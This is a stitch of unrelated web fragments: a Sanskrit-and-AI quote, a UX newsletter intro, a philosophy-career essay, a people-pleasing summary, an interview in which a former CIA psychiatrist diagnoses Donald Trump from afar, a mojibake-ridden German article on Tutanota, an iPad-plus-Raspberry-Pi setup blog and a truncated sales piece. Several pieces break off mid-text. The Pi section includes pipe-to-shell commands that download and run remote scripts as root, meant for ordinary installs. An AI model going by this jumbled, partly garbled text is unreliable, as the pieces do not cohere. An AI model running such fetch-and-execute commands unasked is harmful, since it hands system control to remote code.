<p>For Thomas, the strict grammatical rules of Sanskrit&nbsp;align well&nbsp;with the goals of computer programmers who are ultimately interested in the “question of how to create interface between computers and human languages.”&nbsp; He maintains that Sanskrit is well positioned to do so because of its algorithmic foundation. “Computers don’t understand linguistics, they understand rules,” he says.&nbsp;&nbsp;</p>

<p>In addition, the rigidity of Sanskrit makes it less likely that an artificial intelligence algorithm would misinterpret commands. The same can’t&nbsp;be said of a language like English, which is&nbsp;looser with its rules and where words have multiple meanings.</p>

<p>“In English, there are so many influences from different language streams,” Mills says. “It’s kind of a mess.”&nbsp;</p>

Yo! Welcome to Issue N27, this issue is all about UX! We go from UX design patterns to perceived performance and also
have some other goodies for you!                                    </p></div>
                                <p>
                                   I have a guest curator!

                                    On this issue, the links are curated by Fabi, Web Dev hung up on UX Design.
                                    </p><p>
                                    Fabi is a great guy, he has been helping me out with the newsletter now and then and here we are.
                                    </p></div>
                                <p>
                                    Why having a guest?
                                </p>
                                <br>
                                <div><p>
                                    Well, the newsletter takes time to curate, and I have some plans to keep improving my front-end skills, andi need time for myself to be honest. Within my daily work, WICKEDTEMEPLATES and some other upcoming projects I won't have so much time. So I will be taking in some guest curators, but I will make sure the links are fine and suitable.

December 7, 2020 | https://www.careerfair.io/reviews/benefits-of-philosophy-major | <a href="https://web.archive.org/web/*/https://www.careerfair.io/reviews/benefits-of-philosophy-major">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>
I majored in philosophy and now work in tech. 
</p>

<p>
I donâ€™t think I would have been able to transition into tech without any of the skills I developed outside the classroom (such as <a href="https://www.careerfair.io/reviews/skill-stack-for-tech-career">learning to code</a> &amp; pursuing quite a few internships). In fact, compared to my peers who studied engineering, Iâ€™ve had to invest much more time outside the classroom in picking up technical concepts. 
</p>
<p>
With that being said, I do think that my philosophy degree benefits me immensely with my day to day. 
</p>
<p>
The three main benefits of my philosophy degree have been the following:
</p>
<ol>

<li>Strong writing skills

</li><li>Ability to make the vague much more precise

</li><li>Ability to craft a strong argument
</li>
</ol>
<h2>Strong writing skills</h2>


<p>
No matter what your role is, youâ€™re going to be communicating with people. And in an increasingly remote world, the ability to express your ideas in a clear and concise manner is extremely valuable. 
</p>
<p>
As a philosophy major, the emphasis was always on writing clearly. Unlike in other humanities classes I took, like sociology, our papers didnâ€™t need to be very long. 
</p>
<p>
The goal was to eliminate fluff and get straight to the point. For example, there was no need to introduce your argument with some sort of historical narrative or background information. 
</p>
<p>
This approach lends itself well to the workplace. Think about long emails and unclear meeting agendas. The ability to parse out what matters and get rid of the rest will make you stand out. 
</p>
<p>
Another writing skill that my philosophy major taught me is â€œsign-postingâ€�. This has to do with using certain phrases, such as â€œ<em>I will give two examples to prove...â€� </em>or â€œ<em>My first objection isâ€¦â€�</em>, in order to make sure that the reader knows where the argument is going at all times. 
</p>

  <center>
    <img src="https://www.careerfair.io/assets_philobenefits/signposting.png" alt="">
  </center>

<p>
An added benefit of using sign-posting is that it enables the reader to skim your writing and still understand everything youâ€™re trying to say. In web design, itâ€™s often advised to ensure that your content is easy to skim by adding headings, sub-headings, images etc. Think of signposting as making your writing easier to parse. 
</p>
<p>
Finally, I realized early on that a philosophy paper is never written in one go. Itâ€™s an iterative process that demands you create a clear outline and revise each part until you have a coherent argument. 
</p>
<p>
Much of this revision process is better done by collaborating with other people. Reading your argument out loud will often make you realize that it doesnâ€™t make sense. Or that it actually doesnâ€™t get across what youâ€™re trying to say. 
</p>
<p>
I canâ€™t tell you how many times reaching out to someone at work to read over something I wrote has been helpful. Getting a second pair of eyes can help identify flawed assumptions and tighten up documentation. 
</p>

<h2>Ability to make the vague much more precise</h2>


<p>
Philosophy is pretty similar to math in the sense that both fields require you to make assumptions and then investigate the consequences of those assumptions.
</p>
<p>
Unlike math, though, which is very narrow and technical, philosophy aims to solve problems that are very messy and fuzzy. 
</p>
<p>
As a result, when investigating an open-ended question, it's a philosopherâ€™s job to add as much precision as possible. 
</p>
<p>
Let me give an example. I recently came <a href="https://www.sheffield.ac.uk/polopoly_fs/1.71449%21/file/atkin.pdf">across the case</a> of a group of youngsters who were tried and sentenced in Kansas after a video tape of them torturing and burning a dog surfaced in the public.
</p>
<p>
Now, also note that many prominent criminal psychologists have long recognized cruelty to animals as a precursor to violence against humans. In other words, the likelihood of someone committing a crime against humans is considered to be higher if theyâ€™ve in the past committed animal cruelty. 
</p>
<p>
So letâ€™s go back to this case. It seems fairly obvious that the judge is going to sentence these youngsters to some time in prison. But wait a second - is he also going to take into account the fact that they are <em>now potentially more likely</em> to commit a crime against humans in the future? Or is he just going to sentence them for what they did?
</p>
<p>
The distinction here is crucial. If the judge solely sentences the youngsters for what they did to the dog, then we can say that the judge is taking a <em>retributivist view</em>. By this, we mean that the judge is issuing a penalty that is in direct proportion to the magnitude of the crime committed.
</p>
<p>
But if the judge does decide to lengthen their sentence because he believes that there is a potential future risk of them hurting other humans, then he is taking a <em>consequentialist </em>view. Here, the judge is <em>also</em> punishing for a crime that has not yet been committed (but could potentially be) for the sake of securing a greater social good. 
</p>


  <center>
    <img src="https://www.careerfair.io/assets_philobenefits/retributivism.png" alt="">
  </center>

<p>
So the rather vague conclusion of â€œYoungsters sentenced to prison for hurting a dogâ€� can actually be made much more specific by examining the two theories of retributivism and consequentialism. 
</p>
<p>
A philosopherâ€™s job is to make both sides of the argument crystal clear. And when thereâ€™s room for ambiguity (which is most of the time), his/her job is to fill in the gaps.
</p>
<p>
A practical application of the above in my day to day is when I need to understand what a client really wants. Theyâ€™ll often be extremely vague about their requests and it is my job to capture the more important bits of information and then transfer that knowledge to my team. 
</p>
<p>
Now, I obviously donâ€™t have to deal with moral issues like the animal cruelty case above, but the exercise of critically evaluating the different pieces to an argument has come in very useful. 
</p>
<h2>Ability to craft a strong argument</h2>


<p>
An argument is a group of statements including one or more premises and one and only one conclusion (<a href="https://www.uky.edu/~rosdatte/phi120/lesson1a.htm#:~:text=A%20premise%20is%20a%20statement,premises%20in%20a%20single%20argument.&amp;text=The%20foolproof%20way%20to%20do,this%20question%20is%20the%20conclusion.">source</a>).
</p>
<p>
If you can identify a false premise, you can invalidate an argument. 
</p>
<p>
One of the ways in which I learnt how to do this is by argument mapping. <a href="http://shamik.net/">One of my professors</a> introduced us to a tool called <a href="https://www.rationaleonline.com/">Rationale</a> that makes it really easy to do this. For example, hereâ€™s what an argument map for intelligent design might look like:
</p>

  <center>
    <img src="https://www.careerfair.io/assets_philobenefits/argument_map.png" alt="">
  </center>

<p>
An argument map makes it very easy to follow an argument. My professor would always encourage us to create an argument map before we actually started writing our papers because it would make the writing process much simpler. 
</p>
<p>
Instead of just stating why I think an argument is flawed, an argument map made it easy for me to point to exactly which premise I disagreed with and to present an objection (as can be seen with the red colored boxes). 
</p>
<p>
Argument maps also make it easy to answer the question: â€œHow does this sentence fit into the larger structure?â€� By visualizing statements that are used to support one another, I am able to understand their necessity. 
</p>
<p>
Finally, argument mapping also helps with anticipating potential objections to my argument. Even though I could find my overall argument to be convincing, there would be certain premises that could be better worded. 
</p>
<p>
The above is all very useful in my day to day. Iâ€™m able to comprehend, synthesize, and communicate information in a persuasive manner.. Whether it be in gathering approval from my team members to pursue a certain solution or crafting an email to a client to increase revenue, my ability to craft strong arguments comes in handy everyday.

<p>
There are certainly ways to get the above benefits <em>without</em> having studied philosophy. But I hope that my account has convinced you that philosophy, even when not pursued further in academia, can yield surprisingly practical benefits to whatever career you choose to pursue. 
</p>
<p>
The ability to communicate well and to form clear arguments is useful in just about every field. 
</p>
<p>
If youâ€™re a philosophy major, you'll likely have to spend quite a bit of time outside the classroom picking up industry specific skills. But rather than playing â€œcatch-upâ€�, the combination of these newly acquired skills and the solid base that your philosophy degree has provided you with will make you even more valuable in the long-run.

									<p><span>“Being someone who pleases people sounds, on the face of it, like a very good idea. But it is a pattern of behavior riddled with problems, as much for the perpetrator as for their audience…” — TSOL</span></p>
<p><span>This may sound brutal, but people-pleasers can be considered…liars. However, the lying isn’t to gain some kind of advantage, but more so the fear of displeasing others.&nbsp;</span></p>
<p><span>“They act like the perfect lover when their real feelings are far darker; they give their assent to plans they hate; and they confuse everyone around them by failing to express, in due time, with the requisite courage, their authentic needs and ambitions.” — TSOL</span></p>
<p><span>A people-pleaser is someone who at times can be themselves, but oftentimes feel they have no option but to mold themselves to the expectations of others.&nbsp;</span></p>
<p><span>The School of Life gives three ideas on how to not fall victim to being a people pleaser:</span></p>
<ol>
<li><span>Remind yourself that your colleagues, partners, and friends are very different from the people you shaped yourself towards in childhood. Most people can be fine with disagreements, receiving bad news, or an occasional rejection. If not, maybe cut those people out of your life?</span></li>
<li><span>“Acknowledge the inadvertently harmful side-effects of our behavior. We may genuinely have good intentions, but we are endangering everyone by not speaking more frankly.” — TSOL</span></li>
<li><span>It’s 100% up to you to be firm and authentic with your views and opinions (while still being respectful. The School of Life adds, “acquire the confidence to be artful about the difficult messages we have to impart.”</span></li>
</ol>

								</p><!-- end half sqaure arrow -->
								<p><b><i>My two cents</i></b><span>: This is a very interesting piece if you identify as a people-pleaser. Even if you don’t, this digital vitamin can give you a small 1mg boost of empathy for those that suffer from people-pleasing syndrome (not a real syndrome). It’s so fascinating how people pleasers became people-pleasers in childhood (for the most part) and how ultimately, it either manifested more in adulthood or tapered off. </span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Dr. Jerrold M. Post was a highly respected trailblazer as the CIA’s first political profiler, the founder of the discipline of political psychology. Post, a psychiatrist who served for two decades at the&nbsp; CIA, died on November 22 of covid-19. He was 86 years old.&nbsp;</p><p>In January, just&nbsp; before the start of the pandemic, Post participated in one of his final interviews with Jonathan Winer and me for our podcast, <a href="https://unconventionalthreat.com/">Unconventional Threat</a>.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F2ff3c9b3-4098-4412-b06b-1824dbe2c905_1280x720.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F2ff3c9b3-4098-4412-b06b-1824dbe2c905_1280x720.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/2ff3c9b3-4098-4412-b06b-1824dbe2c905_1280x720.jpeg&quot;,&quot;height&quot;:720,&quot;width&quot;:1280,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:146382,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>By that time, his concerns about President Donald Trump had led him to break with the strictures other colleagues felt to produce and publish a profile equivalent to others he had done for the CIA. Post had created the Center for the Analysis of Personality and Political Behavior at the CIA. Over time, he had profiled Menachem Begin and Anwar Sadat for President Jimmy Carter prior to the Camp David Accords. He also produced profiles of&nbsp; Kim Jong-Il, Osama bin Laden, and Saddam Hussein, among others.</p><p>He now decided to apply the same techniques he had used on world leaders and others to analyze the President of the United States. In so doing, he was breaking a longstanding guideline established by the American Psychiatric Association, known as the Goldwater rule, in which professionals do not diagnose public figures who they have not personally examined and assessed. However, in a long-ranging interview, Post said that Donald Trump represented a clear and present danger to the United States. He said that Trump’s actions in plain sight and his well-known biography made it possible to describe the dangers in psychiatric terms. And he felt compelled to discuss his findings.</p><p>One of Post’s fellow psychiatrists, Dr. Bandy Lee of Yale University, also spoke to us for the podcast. Specializing in violence prevention and prison reform, Lee edited a book, <a href="https://us.macmillan.com/books/9781250212863">The Dangerous Case of Donald Trump</a>, essays by 37 psychiatrists and mental health specialists about Trump. Lee said that Post offered his prominence to highlight analysis of the Trump presidency and Trump’s mental state, despite the strictures placed on psychiatrists by the Goldwater rule. Post contributed an essay to that volume, before writing his own book, <a href="https://www.simonandschuster.com/books/Dangerous-Charisma/Jerrold-Post/9781643132181">Dangerous Charisma: The Political Psychology of Donald Trump and His Followers.</a></p><p>Lee praised Post’s decision to go public and said that his support and prominence in the field helped guide her role.&nbsp;</p><p>&nbsp;“He, too, was very disturbed about the president's dangerous psychology,” she said. Post’s “generous concern moved me since, in this country, while the CIA may have done profiles regularly for decades, the same is not permitted for the public (the American Psychiatric Association also made clear with the Trump administration that our own leaders are off-limits, no matter the dangers they pose).”</p><p>In our interview, Post said he applied the profiling categories he had pioneered over time not only to describe Donald Trump as a dangerous personality. Among other things he said he had fears for the 2020 elections: If Trump won by a small margin, he would once again declare a landslide. But if he lost, he would never accept the outcome.&nbsp;</p><p>Here are condensed, edited excerpts from our talk:</p><p><em>Q: In your book, "Dangerous Charisma," you describe Donald Trump as a malignant narcissist.</em></p><p>Post: He's almost a caricature of the narcissistic personality, in particular, malignant narcissism. He's consumed with self-adoration. Certainly he is, without any shred of empathy for others. Consider the way he dealt with John McCain, mocking him as he was on his deathbed with malignant brain cancer. Or consider him mocking the reporter who had a congenital disability, which gave him a tremor. Recall his remarkably unempathetic response to the Pakistani American who was a Gold Star father, having lost his heroic son in Afghanistan. In each of these cases he, in a rather cruel way, mocked these individuals.</p><p>This is an extremely unattractive characteristic, but he also led his followers to mount their feelings in opposition to these individuals. So that's one striking quality. He's very sensitive to slight, which is one of the characteristics of the narcissist. And he can then retaliate angrily for a minor offense. So that this is one of the makings of a sycophantic leadership, because to criticize constructively [will] lead to his angry response.</p><p><em>Q: How dangerous is this behavior?&nbsp;</em></p><p>Post: Well this is unique. If you have a young person who is damaged in some way and starts exhibiting these characteristics, they may not go any place other than to exhibit these characteristics in private, and just go off into a medium level life. But then you might have somebody who has a father who is a multimillionaire and you're able to start seeing that the whims of this type of personality are able to be answered because of the wealth that surrounds the personality. And then as things grow and grow with more and more accumulation, more and more ability to fulfill the whims of this personality.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F33b561d9-cdfb-4ef6-8a55-f5ffd61d73b5_1200x937.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F33b561d9-cdfb-4ef6-8a55-f5ffd61d73b5_1200x937.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/33b561d9-cdfb-4ef6-8a55-f5ffd61d73b5_1200x937.jpeg&quot;,&quot;height&quot;:937,&quot;width&quot;:1200,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:173265,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p><em>Q: But this is now more than a wealthy person, this is the ultimate extreme, isn’t it?</em></p><blockquote><p>Post: One of the things that concerns me has to do with his decision-making under stress. </p></blockquote><p>That is when he is most apt to give voice to extreme positions and that is very worrisome. The assassination of Soleimani [Quds commander Qasem Soleimani by U.S. forces in Iran last January] is perhaps a good example. [Trump] was looking for an array of possible options to choose...And he chose the most extreme position on that list, which was the assassination of Soleimani, who was a very revered figure in Iran. This was an extremely over-reactive policy and one which it stopped only after the Iranians decided after their careful attacks on our air bases in Iraq that it would stop. But it greatly weakened our policy. And we were within an inch of what would have been a dreadful situation. This is not the first time this has happened. We've seen the possibility of conflict suddenly emerge with North Korea and on trade with China and then disappear.&nbsp;</p><p><em>Q: What is it about his personality that seems to thrive on creating a crisis and then having it go away? And that is a pattern, is it not?</em></p><p>Post: It is indeed. He had as a mentor, Roy Cohn, who was the right hand man to Senator [Joseph] McCarthy. One of the maxims Trump adapted from him…is when someone slaps you, hit him back 10 times harder. Well, that's an interesting prescription. So this is defensive aggression, which can then drive a situation out of control.</p><p><em>Q: Is there an element of cowardice in behavior like this at the same time? Is it possible that somebody lashes out actually because of feeling frightened and inadequate and they kind of lash out as a result?</em></p><p>Post: It's really important to think of Trump in layers. The outside layer is one of grandiosity. And what's underneath that? Think of an onion, hollow in the center. This is a very difficult personality. He's learned a number of maxims, which he regularly details in his book, <a href="https://www.penguinrandomhouse.ca/books/180675/trump-the-art-of-the-deal-by-donald-j-trump-with-tony-schwartz/9780399594496/excerpt">The Art of the Deal.</a> His books give a very vivid portrait of someone who has a very powerful exterior, which, inferentially we can conclude, has a great deal of insecurity underneath them.</p><p><em>Q: Well, he seems every time to escape scrutiny, and to be able to accomplish more. Are there any limits?</em></p><p>Post: The limits of his ambition are boundless. Let me give one example. I've been struck by the desire to build a secure border wall [on the Mexican border]. He has been obsessing about this and in a remarkable fashion. And I think indeed he wants this to be the Great Wall of Trump…I think that this transcends just the security question and has meant to cement his reputation.</p><p><em>Q: We were talking about Donald Trump's not telling the truth. And by being a malignant narcissist, does your psychological profile suggest might be the reason he lies so much. What is the lying about and why is the lying increasing over time?</em></p><p>Post: Well, the lying is usually about aspects of history and concluding contemporary relations. He is recasting history to put himself in a more favorable place. But I don't know that he after a while sees this as a lie as much as coming to believe his own propaganda. He ends up after saying it enough times that this becomes his truth too.</p><p><em>Q: What are the implications of his lying not only for his followers, but also for the rest of the world?</em></p><blockquote><p>Post: He's being mocked in other parts of the world for his grandiosity and for his not telling the truth. But his followers don't see either of those things.</p><p><em>Q: What do they see? And why?&nbsp;</em></p></blockquote><p>Post: Well, that raises an interesting question. You're talking about his followers homogeneously as if it's one block and there's a spread from the core of totally committed followers. In other words, some people will follow him all the way to the top of the cliff onto the shores below, and others won't.</p><p><em>Q: You’ve written about the elections and how that would play out. And you quoted from Dylan Thomas in that regard.</em></p><p>Post:&nbsp; Yes, “Do Not Go Gentle Into That Good Night.” Drawing on that, I think we can say of Trump, facing the loss of the limelight of the presidency, he will not go gentle into that good night, but full of rage, rage at the passing of the light. As a narcissist, he collects every day newspapers that write about him, and has a pile of magazines with him on the cover. His need for glorification is insatiable, insatiable…insatiable.</p><p data-attrs="{&quot;url&quot;:&quot;https://www.spytalk.co/subscribe?&amp;gift=true&quot;,&quot;text&quot;:&quot;Give a gift subscription&quot;,&quot;class&quot;:null}"><a href="https://www.spytalk.co/subscribe?&amp;gift=true"><span>Give a gift subscription</span></a></p><p><em>Q: So what happens if he sees a threat to the loss of glory?

So what happens in November 2020 if millions of legal voters reject him and if it looks like he's losing, what do you think that happens?</em></p><blockquote><p>Post: If he loses, the period between the election and the inauguration will be a very dangerous period.

      <p>Tutanota gehÃ¶rt zu den wenigen E-Mail-Anbietern, die standardmÃ¤ÃŸig alle eingehenden Mails verschlÃ¼sseln.

<p>Tutanota will Beschwerde gegen den Beschluss einlegen, diese hat jedoch keine aufschiebende Wirkung. â€žWir mussten daher bereits mit der Entwicklung der Ãœberwachungsfunktion beginnenâ€œ, erklÃ¤rte eine Sprecherin Mitte November gegenÃ¼ber câ€™t. Sollte die Beschwerde Erfolg haben, werde man die Funktion nicht aktivieren beziehungsweise wieder entfernen.</p>
<h3 id="nav_abweichende__0">Abweichende Rechtssprechung</h3>
<p>Das KÃ¶lner Urteil ist bemerkenswert, weil es von der Rechtsprechung anderer Gerichte abweicht. So hatte im Sommer <a href="https://www.heise.de/news/Mailanbieter-Tutanota-Staatsanwaltschaft-wollte-Chef-in-Beugehaft-nehmen-4908806.html">das Landgericht Hannover entschieden</a>, dass Tutanota im rechtlichen Sinn keine â€žTelekommunikationsdiensteâ€œ erbringt oder daran mitwirkt â€“ und deshalb auch nicht zur TelekommunikationsÃ¼berwachung verpflichtet werden kann. Die hannoverschen Richter verwiesen wiederum auf ein Grundsatzurteil des EuropÃ¤ischen Gerichtshof (EuGH) von 2019. Diesem zufolge sind E-Mail-Dienste keine Kommunikationsdienste.</p>

  <a-script name="132" needs-consent="" src="https://a.teads.tv/page/87298/tag"></a-script>
  


<p>Das KÃ¶lner Gericht sieht Tutanota dennoch als â€žMitwirkendenâ€œ bei der Erbringung von Telekommunikationsdiensten. Folglich mÃ¼sse das Unternehmen die Ãœberwachung ermÃ¶glichen. Das Urteil, das câ€™t vorliegt, nennt allerdings weder den Namen noch den Betreiber des Telekommunikationsdienstes, an dem Tutanota angeblich mitwirkt. Aus Sicht des Unternehmens ist das Urteil deshalb â€žabsurdâ€œ.</p>

<p>In dem Fall geht es um eine Erpressungsmail, die von einem Tutanota-Postfach aus an einen Autozulieferer gesendet worden war. Tutanota sieht sich nun gezwungen, bis Jahresende eine Funktion zu programmieren, die es dem Landeskriminalamt Nordrhein-Westfalen ermÃ¶glicht, dieses Postfach zu Ã¼berwachen.</p>

<p>FÃ¼r die anderen Nutzer soll sich dadurch nichts Ã¤ndern, ihre Mails sollen weiter standardmÃ¤ÃŸig verschlÃ¼sselt werden. Gleichwohl sieht Tutanota eine einmalige Umgehung der VerschlÃ¼sselung als Datenschutz- und Sicherheitsrisiko fÃ¼r letztlich alle Kunden an.</p>
<p><strong>[Update, 30.11., 12 Uhr]</strong> Wie Tutanota betonte, betrifft die ÃœberwachungsmaÃŸnahme nur die neu eingehenden unverschlÃ¼sselten E-Mails. Bereits verschlÃ¼sselte Daten sowie Ende-zu-Ende verschlÃ¼sselte E-Mails in Tutanota kann das Unternehmen nicht entschlÃ¼sseln.<strong> [Update]</strong></p>
<p>AuÃŸer Tutanota speichern auch einige andere Anbieter alle eingehenden Mails in verschlÃ¼sselter Form. Bei Protonmail ist das ebenfalls Standard, Posteo und Mailbox.org bieten die VerschlÃ¼sselung als Option an. Einen Ãœberblick Ã¼ber die Zahl der Anfragen von BehÃ¶rden gibt Tutanota in seinem <a href="https://tutanota.com/blog/posts/transparency-report/" rel="external noopener" target="_blank">Transparenzbericht</a>.</p>

      <p><time>07 Dec 2020</time></p>      
                    <figure>
              <img src="https://hicks.design/media/pages/journal/ipad-pi/fb5e502d5e-1607349248/main.jpg" alt="iPad Pro with Raspberry Pi 4 attached via USB-C">
          </figure>
        
        <p>Beware, this is a geeky one 🤓.</p>
<p>Earlier this year, I updated my <a href="https://hicks.design/journal/ipad-pro-as-computer-one-year-on">status on using the iPad as a computer</a>. In that post I highlighted two obstacles: Ergonomics and Web Development. For the first issue, some of the problems were alleviated by (finally) getting proper mouse support, and the wonderful '<a href="https://hicks.design/journal/ipad-pro-magic-keyboard-thoughts">Magic Keyboard</a>'. I had high hopes for external screen support (not just mirroring) at this year's WWDC in June, but it came and went without any news.</p>
<p>As for Web Development, you still can't run a webserver on the iPad, <em>but</em>, you can attach a Rasberry Pi! The <a href="https://www.raspberrypi.org/products/compute-module-4/?variant=raspberry-pi-cm4001000&amp;resellerType=home">latest incarnation of the Pi</a> (#4) uses USB-C for its power source, allowing a single cable to connect the Pi to the iPad and get both data and power supply from it. This works particulary well with the Magic Keyboard, as you can power both devices through its USB-C port (which can do power, but not data), leaving the iPad's free to connect the Pi.</p>
<figure><img alt="Pi 4 in its packaging" src="https://hicks.design/media/pages/journal/ipad-pi/1bfc53f1b9-1607349248/IMG_0063.jpeg"></figure>
<p>Obviously, any 'normal' computer easily run a webserver, but I really enjoy working on the iPad and tinkering, so wanted to see if it was possible. But why use an add-on piece of hardware, instead of SSHing into a remote server? For me the big advantage is file transfer. I can set up a Samba share on the Pi, and have those directories appear in the native Files app on the iPad. I can then edit text files in a code editor app rather than use terminal (VIM, Nano etc) or a browser-based instance of Visual Studio. Other assets like images can also be saved directly to the Pi via the iPadOS save dialog.</p>
<p>The Pi 4 is small and light (and if you could remove the redundant USB and ethernet ports it could be even smaller) and <a href="https://thepihut.com/products/raspberry-pi-4-model-b?variant=20064052740158">can be bought for as little as £34</a> for the 2gb memory option. I decided on the 4gb for a bit more oomph, and a <a href="https://thepihut.com/collections/raspberry-pi-cases/products/flirc-raspberry-pi-4-case">nice aluminium case to protect it</a>. Setting up the SD card on the Mac was super simple with the <a href="https://www.raspberrypi.org/downloads/">Rasberry Pi Imager app</a>.  </p>
<figure><img alt="" src="https://hicks.design/media/pages/journal/ipad-pi/8bdd37821d-1607349248/imager.png"><figcaption>The imager app has just three steps - choose an OS, an SD card and then press write</figcaption></figure>
<p>For the initial setup, you'll need a separate monitor, keyboard and mouse, but once configured you can attach over VNC (using the Screens app) and SSH. VNC is sluggish, but useful for some setting up tasks. You'll mostly want to use the command line to interact with the Pi though, which means using SSH. More on that later.</p>
<figure><img alt="" src="https://hicks.design/media/pages/journal/ipad-pi/379796af97-1607349249/screens.jpg"><figcaption>Raspberry Pi, viewed on the iPad Pro via Screens app</figcaption></figure>
<p>The first part of the process is to setup the Pi so that it can be used as an 'Ethernet Device' on the iPad. This has quite a few steps, but is very well documented over on <a href="https://magpi.raspberrypi.org/articles/connect-raspberry-pi-4-to-ipad-pro-with-a-usb-c-cable">MagPi Magazine's article</a>. A summary of the process is:</p>
<ul>
<li>Setup the Pi as a USB device and give it a fixed IP</li>
<li>Enable SSH</li>
<li>Enable access over VNC</li>
<li>Install Samba and setup a folder to share</li>
</ul>
<figure><img alt="Final assembled Rasberry Pi 4 in its aluminium case, connected to the iPad via USB-C" src="https://hicks.design/media/pages/journal/ipad-pi/a4cbfb82ba-1607349248/1.jpeg"></figure>
<p>These steps were more straightforward than I expected and took me about 30 mins. So far, so good! But here's where the instructions run out, and I still haven't setup the web server. There are a few more installations to do, but now I can access the Pi via SSH to do this. I tried out quite a few SSH apps, but they all suffer from a limitation where the connection will drop if it's in the background for longer than 20 seconds. If, like me, you spend a lot of time googling for shell commands to install things and then switching back to the terminal, you can find your connection has been lost and you have to start again.  </p>
<p>The key here is the <a href="https://hicks.design/journal/[https://blink.sh](https://blink.sh/)">Blink Shell app</a>, which supports Mosh (Mobile Shell), so that connections stay open. To make use of this, you first need to install Mosh on the Pi: </p>
<pre><code>sudo apt-get install mosh</code></pre>
<p>With Blink, the whole screen is devoted to the terminal, which means that opening the app for the first time is a little daunting. No visible UI, just a command line prompt that says 'blink &gt;'. Stick with it though, because there's a lot there, it's just not immediately obvious. For example, you can use your standard keyboard shortcuts to create and navigate between other tabs. I particularly like being able to add a pre-configured host (in this case I called it 'Pi') so that all I have to do is type:</p>
<pre><code>ssh Pi </code></pre>
<p>…and I'm connected! It even supports external displays (although I would never need a terminal <em>that</em> big). </p>

<h2>Setting up the stack</h2>
<p>Now I can install the web stack, and my needs are fairly simple: Apache, PHP, Node and Git. Your needs will be different, but whatever you need to install the first step is always to update the package manager:</p>
<pre><code>sudo apt update</code></pre>
<p>Then I installed Apache, PHP, Git, Maria (MySQL), Composer and Node:</p>
<pre><code>sudo apt install apache2 -y
sudo apt install php libapache2-mod-php -y
sudo apt updatesudo apt install git
sudo apt install mariadb-server mariadb-client -y
curl -sS https://getcomposer.org/installer | php
$ sudo mv composer.phar /usr/local/bin/composer
$ curl -sL https://deb.nodesource.com/setup_8.x | sudo -E bash -
$ sudo apt install nodejs</code></pre>
<p>I should point out that when it comes to this part I'm a copy-and-paster, and I'm aware that you shouldn't always install things as a root user (<code>sudo</code>), so do get a second opinion before doing any of this.</p>
<h2>Setting up Virtual Hosts</h2>
<p>The final part I needed to get working was virtual hosts, so that I could view different sites on the iPad. I followed the <a href="https://www.stewright.me/2013/08/add-virtual-hosts-and-subdomains-to-your-raspberry-pi-apache2-server/">instructions by Ste Wright</a>.  So far, I've only got it working via different port numbers, not named servers, but that's enough. </p>
<p>One step of this that's worth reiterating is that after adding a new host, you'll need to enable it, which creates a link from /sites-available/ to /sites-enabled/. This can only be done via command-line (copying the file won't work). In my case, I called the conf file 'vhosts' so to enable the virtual host I did:</p>
<pre><code>a2ensite vhosts</code></pre>
<p>Don't forget to restart apache after you've done:</p>
<pre><code>systemctl reload apache</code></pre>
<p>And finally… I can run a server and view it in Safari!  Finally, when I'm finished, I can shut down the Pi with:</p>
<pre><code>sudo shutdown -h now</code></pre>
<p>Or turn it off using the Raspbian GUI in Screens app.</p>
<h2>Conclusion</h2>
<p>Enough about all the technical setup, does it work? Why, yes it does! </p>
<p>I found following the instructions for initial setup were straightforward. The hardest part of the setup (for me) was the webserver part, running into issues with permissions and dependencies. An experienced developer won't have these issues, but I got so much further than I expected.</p>
<h2>Pros</h2>
<ul>
<li>It's small, inexpensive, light and it actually <em>works</em>. </li>
</ul>
<h2>Cons</h2>
<ul>
<li>First of all, it shouldn't be necessary. </li>
<li>Secondly, I've had some issues with the Pi dropping connection, and being a headless setup makes it hard to know what happened. My guess is that the USB-C cable came out slightly, and the power went off.</li>
<li>Also, running the webserver is only one part of the deal - we still need better inspection tools and the ability to test in different browsers (all iPadOS browsers use the same rendering engine). Using the Screens app, you can use Firefox or Chrome on the Pi for better webdev tools, but this is a slower way to work. </li>
</ul>
<p>The arrival of the M1 Silicon Macs might make this all moot. From all accounts, the speed and snappiness that draws me to the iPad has finally come to MacBooks. It also brings the ability to run iOS and iPadOS apps, so <em>surely</em> touchscreens can't be too far off? For now, this is a good enough setup, maybe not as a full-time solution, but to support my MacBook Pro.</p>

<p>You are in a Sales Conversation with a prospect. The discussion went well and mostly covered features, benefits, and how they relate to the prospect’s use cases. But now what? Should you push for the close?<br>If you’re not sure, it’s best to ask, “What are the best next steps?” But in many situations, you don’t need to ask explicitly because the prospect has already told you they want to move forward.<br>During the conversation, the prospect decided if they want to move forward with the purchase or not.<br>The decision influences the following questions. Instead of asking more product-related questions, they start to give you so-called buying signals. Buying signals are questions that indicate the purchase.</p>



<p>Here are seven of the most common buying signals:</p>



